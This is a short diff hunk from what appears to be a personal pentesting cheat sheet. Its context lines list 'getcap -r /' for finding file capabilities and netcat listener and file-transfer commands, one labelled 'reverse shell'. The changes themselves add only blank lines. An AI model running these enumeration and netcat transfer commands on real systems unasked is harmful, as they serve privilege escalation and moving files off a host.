@@ -46,9 +46,11 @@
          return 0;
       }
    *capabilities
+
        getcap -r / 2>/dev/null
 
    *file share
+   
        nc -lvnp 9000<file.txt
        reverse shell : nc ip port>file.txt
        nc -lvnp 9000
